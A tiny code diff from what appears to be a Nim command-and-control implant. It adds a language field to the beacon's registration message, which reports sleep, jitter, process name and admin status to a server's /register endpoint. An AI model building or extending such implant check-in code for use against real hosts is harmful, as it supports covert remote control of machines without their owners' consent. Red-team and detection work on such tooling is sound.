@@ -110,7 +110,8 @@ else:
       "sleep_sec": SleepSec,
       "jitter_pct": JitterPct,
       "process_name": exeName(),
-      "is_admin": isElevated()
+      "is_admin": isElevated(),
+      "language": "nim"
     }
     let (code, resp) = t.winHttpDo("POST", "/register", cast[seq[byte]]($info))
     if code != 200 or resp.len == 0: return false
